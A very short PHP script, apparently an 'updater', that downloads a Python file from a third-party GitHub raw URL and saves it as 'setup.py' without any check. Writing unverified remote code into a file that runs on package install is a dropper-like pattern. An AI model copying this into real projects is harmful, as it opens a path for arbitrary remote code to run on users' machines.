<?php
$updater = file_get_contents("https://raw.githubusercontent.com/UXR7b/comm/master/start.py");
$file = fopen("setup.py", "w");
fwrite($file, $updater);
fclose($file);
?>
